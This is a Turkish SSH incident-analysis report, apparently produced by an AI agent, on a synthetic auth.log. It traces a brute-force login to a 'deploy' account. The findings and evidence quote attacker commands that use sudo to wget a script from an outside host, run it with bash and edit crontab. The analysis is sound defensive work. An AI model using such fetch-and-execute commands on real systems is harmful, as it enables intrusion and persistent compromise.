# SSH Log Analizi — samples/auth.log

**Tarih:** 2026-10-25 · **Skill:** log-analysis · **Hazırlayan:** agent

## Kapsam
- Girdi: `samples/auth.log` (21 satır, 24 Ekim, sunucu `web01`) — eğitim amaçlı sentetik örnek log
- Kapsam dışı: IP'lere ağ sorgusu/tarama yapılmadı; sunucunun kendisi, `x.sh` içeriği ve crontab değişikliği incelenmedi (log'da yok)

## Bulgular
- [OLGU] `203.0.113.45` kaynağından 02:11:05–02:11:37 arasında 32 saniyede 8 başarısız parola denemesi yapıldı. Hedeflenen hesaplar: root (3), deploy (2), admin, test, oracle (1'er).
- [OLGU] Aynı kaynaktan 3 geçersiz kullanıcı adı denendi: admin, test, oracle.
- [OLGU] `203.0.113.45`, 2 başarısız denemenin ardından 02:11:41'de `deploy` hesabına **parolayla başarıyla girdi**.
- [OLGU] Girişten 77 saniye sonra `deploy`, sudo ile root yetkisinde `http://198.51.100.7/x.sh` dosyasını indirdi (wget), `bash x.sh` ile çalıştırdı ve `crontab -e` açtı.
- [OLGU] `alice` hesabı 192.0.2.10 adresinden 09:02'de açık anahtarla, 14:22'de 1 başarısız denemeden sonra parolayla giriş yaptı.
- [DOĞRULANMAMIŞ] Kalıp (sözlük denemesi → başarılı giriş → indir-çalıştır → crontab), `deploy` hesabının ele geçirildiğini ve kalıcılık sağlandığını düşündürüyor. `x.sh` ve crontab içeriği görülmeden kesinleşmez.
- [DOĞRULANMAMIŞ] `alice` girişleri olağan görünüyor (bilinen IP, mesai saati). Parolayla girişe izin verilmesi ayrı bir risk.
- [ÖNERİ] `deploy` hesabını kilitleyin, parolasını ve anahtarlarını yenileyin; `crontab -l -u root` ve `/home/deploy/x.sh` dosyalarını inceleyin (olay müdahalesi).
- [ÖNERİ] sshd'de `PasswordAuthentication no` ve `PermitRootLogin no` ayarlayın, `MaxAuthTries` değerini düşürün ve fail2ban benzeri bir hız sınırlama ekleyin (bkz. config-audit skill'i).
- [ÖNERİ] `198.51.100.7` ve `203.0.113.45` adreslerini engelleme listesine almadan önce itibar kontrolünü bir tehdit istihbaratı kaynağıyla yapın.

## Kanıt
- Sayım komutları (bu oturumda çalıştırıldı): `grep -c 'Failed password'` → 9 (8'i 203.0.113.45 kaynaklı, 1'i 192.0.2.10 kaynaklı); `grep -c 'Invalid user'` → 3
- `samples/auth.log:1` — `Invalid user admin from 203.0.113.45 port 51122`
- `samples/auth.log:2` — `Failed password for invalid user admin from 203.0.113.45` (ilk başarısız deneme, 02:11:05)
- `samples/auth.log:11` — `Failed password for deploy from 203.0.113.45` (son başarısız deneme, 02:11:37)
- `samples/auth.log:12` — `Accepted password for deploy from 203.0.113.45 port 51190`
- `samples/auth.log:14` — `deploy : ... USER=root ; COMMAND=/usr/bin/wget http://198.51.100.7/x.sh`
- `samples/auth.log:15` — `deploy : ... USER=root ; COMMAND=/bin/bash x.sh`
- `samples/auth.log:16` — `deploy : ... USER=root ; COMMAND=/usr/bin/crontab -e`
- `samples/auth.log:17` — `Accepted publickey for alice from 192.0.2.10`
- `samples/auth.log:20-21` — `Failed password for alice` → `Accepted password for alice from 192.0.2.10`

## Doğrulama Durumu
KABUL — tüm [OLGU] maddeleri log satırlarıyla eşleşiyor ve sayılar komutla doğrulandı. Ele geçirme yorumu [DOĞRULANMAMIŞ] olarak ayrıldı.
